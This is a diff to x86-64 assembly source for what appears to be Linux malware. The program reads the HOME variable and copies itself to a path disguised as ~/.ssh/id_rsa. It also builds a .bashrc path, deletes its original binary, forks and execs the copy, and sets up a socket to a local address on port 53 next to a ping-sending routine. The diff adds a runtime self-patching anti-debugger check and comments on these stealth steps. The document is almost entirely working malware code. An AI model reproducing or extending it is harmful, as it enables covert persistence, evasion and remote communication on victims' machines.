@@ -6,13 +6,11 @@ struc   sockaddr
 	sin_port:	resw	1
 	sin_addr:	resd	1
     padding:    resb    8
-
-endstruc
+    endstruc
 
 struc   inaddr
 	s_addr:	resq	1
-
-endstruc
+    endstruc
 
 section .data
 
@@ -28,10 +26,10 @@ section .data
 
     sock_addr:
         istruc sockaddr
-            at sin_family,	dw	0x02
-            at sin_port,	dw	0x3500
-            at sin_addr,	dd	0x1a01a8c0
-            at padding,     dq  0X0000000000000000
+            at sin_family,	dw	0x02 ; AF_INET
+            at sin_port,	dw	0x3500 ; Port 53 
+            at sin_addr,	dd	0x1a01a8c0 ; ip ad
+            at padding,     dq  0X0000000000000000 ; padding
         iend
         
     sock_addr_size EQU $ - sock_addr
@@ -51,6 +49,9 @@ section .data
     command db '/bin/ping',0x00
 
     null db '/dev/null',0x00
+
+    debugger_detected db 'Debugger detected!', 0
+    msg db 'No debugger detected.',0
                
 
 
@@ -93,28 +94,36 @@ _start:
     mov rbp, rsp
     sub rsp, 0x40
 
+    mov rdi, systemcall ; adress of systemcall label
+    mov rax, 0x050f
+    stosw
+
+    systemcall:
+    xor eax, ebx ; this instruction will be replaced by 'syscall' during runtime
+
+    cmp rax, 0
+    jl debuggerDetected
+
+
+ 
     nop
     nop
     nop
     nop
 
-
-;;;;;
 
     mov rax, 0x08
     mov rsi, rsp
-    add rsi, 0x48 ; point to argc
+    add rsi, 0x48 
     mov rcx, [rsi]  
     add rcx, 0x02
+    imul rcx, rax
+    add rsi, rcx ; Stores the first address of envp* 
 
-    imul rcx, rax ; offset to the envp*
-
-    add rsi, rcx ; rsi points to envp*
-    mov rax, 'HOME'
+    mov rax, 'HOME' 
 
 
 .loop: ; the loop parse all the envp* to find the HOME variable
-
     cmp Qword [rsi], 0x00
     je exit
     mov rdi, [rsi]
@@ -125,14 +134,12 @@ _start:
 
 
 .next:
-
     inc rdi
     mov rsi, buf_filename
     xor rcx, rcx
     xor rax, rax
 
-.loop2: ; copies the HOME variable to a buffer
-
+.loop2: ; copies the HOME variable to the filename buffer
     mov al, byte [rdi+rcx]
     cmp al, 0x00
     je .next2
@@ -141,13 +148,11 @@ _start:
     jmp .loop2
 
 .next2:
-
     mov rsi, buf_bash
     xor rcx, rcx
     xor rax, rax
 
-.loop3:
-
+.loop3: ; copies the HOME variable to the bashrc buffer
     mov al, byte [rdi+rcx]
     cmp al, 0x00
     je .next3
@@ -156,15 +161,13 @@ _start:
     jmp .loop3
 
 .next3:
-
     mov rsi, buf_filename
     mov [rbp - 0x20], rcx ; save the HOME variable size in the stack
     add rsi, rcx
     xor rcx, rcx
     mov rdi, filename
 
-.loop4: ; Append the .ssh/id_rsa to the buffer with the HOME variable
-    
+.loop4: ; Append the .ssh/id_rsa (fake_filename) to the buffer with the HOME variable    
     mov al, byte [rdi+rcx]
     cmp al, 0x00
     je .next4
@@ -173,7 +176,6 @@ _start:
     jmp .loop4
 
 .next4:
-
     mov [rsi+rcx], byte 0x00
     mov rsi, buf_bash
     mov rcx, [rbp - 0x20]
@@ -181,8 +183,7 @@ _start:
     mov rdi, bash_path
     xor rcx, rcx
 
-.loop5: ; Append the .ssh/id_rsa to the buffer with the HOME variable
-    
+.loop5: ; append the bashrc path to the HOME variable in the bashrc buffer   
     mov al, byte [rdi+rcx]
     cmp al, 0x00
     je .next5
@@ -191,11 +192,10 @@ _start:
     jmp .loop5
 
 .next5:
+    mov [rsi+rcx], byte 0x00 ; null byte delimiter
 
-    mov [rsi+rcx], byte 0x00
 
-
-;;;;;
+;;;;;;;;;;;;;;;;;;;;;;;;;;
 
 
     mov rsi, rbp
@@ -296,14 +296,14 @@ _start:
 
     mov rdi, [rbp - 0x18]
     mov rax, 0x03
-    syscall
+    syscall ; close the newly created file
 
     mov rdi, [rbp - 0x28] ; argv[0]
     mov rax, 0x57
-    syscall ; unlink
+    syscall ; delete the parent binary
 
     mov rax, 0x39
-    syscall ; fork()
+    syscall ; fork the process
 
     cmp rax, 0x00
     jne exit ; exit the parent process
@@ -315,7 +315,7 @@ _start:
     mov rsi, rsp
     mov rdx, 0x00
     mov rax, 0x3b
-    syscall ; execve(buf_filename, argv, envp)
+    syscall ; Executing the copied binary in the child process
 
     nop
     nop
@@ -650,6 +650,21 @@ send_ping:
 
     leave
     ret
+
+debuggerDetected:
+    mov rax, 0x1
+    mov rdi, 0x1
+    mov rsi, debugger_detected
+    mov rdx, 18
+    syscall
+    
+    mov rax, 0x3C
+    mov rbx, 0x1
+    syscall
+
+    mov rax, 0x3C
+    mov rdi, -1
+    syscall
 
 
 
